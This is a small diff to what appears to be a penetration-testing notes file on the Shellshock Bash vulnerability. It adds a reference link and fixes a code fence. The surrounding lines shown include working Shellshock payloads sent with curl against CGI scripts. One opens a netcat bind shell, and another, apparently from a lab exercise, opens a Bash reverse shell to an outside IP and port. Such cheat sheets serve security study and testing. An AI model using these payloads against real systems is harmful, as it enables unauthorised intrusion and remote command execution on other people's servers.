@@ -10,6 +10,7 @@
 - Execute commands from `environment variables` unintentionally.
 - Caused by Bash processing trailing strings after function definitions in the values of environment variables.
 - Exploitable when attacker has control of environment variables.
+- https://fedoramagazine.org/shellshock-how-does-it-actually-work/
 
 ```
 GET http://shellshock.testsparker.com/cgi-bin/netsparker.cgi HTTP/1.1
@@ -67,7 +68,7 @@ Reverse shell
 curl -A '() { :; }; /bin/bash -c "/usr/bin/nc -lvvp 2345 -e /bin/bash"' http://192.168.1.14/cgi-bin/status
 ```
 
-``` `
+``` 
 curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.203/1234 0>&1' http://10.10.10.56/cgi-bin/user.sh
 ```
 
